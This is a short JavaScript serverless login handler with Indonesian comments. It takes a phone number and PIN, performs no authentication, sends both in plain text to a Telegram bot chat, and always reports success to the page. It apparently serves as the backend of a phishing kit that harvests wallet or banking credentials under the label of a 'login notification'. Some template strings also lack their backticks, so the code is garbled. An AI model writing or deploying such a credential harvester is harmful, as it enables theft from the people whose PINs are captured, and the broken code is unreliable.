// api/login.js
export default async function handler(req, res) {
  // Hanya terima metode POST
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { phone, pin } = req.body;

  // Validasi input
  if (!phone || !pin) {
    return res.status(400).json({ message: 'Phone and PIN required' });
  }

  // Ambil token dan chat ID dari environment variable
  const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
  const adminChatId = process.env.ADMIN_CHAT_ID;

  // Cek apakah environment variable tersedia
  if (!telegramToken || !adminChatId) {
    console.error('Missing TELEGRAM_BOT_TOKEN or ADMIN_CHAT_ID');
    // Tetap beri respons sukses agar frontend tidak error
    return res.status(200).json({ success: true });
  }

  try {
    // Kirim notifikasi ke admin Telegram
    const response = await fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: adminChatId,
        text: 🔔 *Login Notification*\n📞 Phone: \${phone}\\n🔢 PIN: \${pin}\``,
        parse_mode: 'Markdown'
      })
    });

    const result = await response.json();
    if (!result.ok) {
      console.error('Telegram API error:', result);
    } else {
      console.log('Login notification sent successfully');
    }
  } catch (err) {
    console.error('Error sending Telegram message:', err);
  }

  // Selalu kembalikan sukses ke frontend
  return res.status(200).json({ success: true });
}
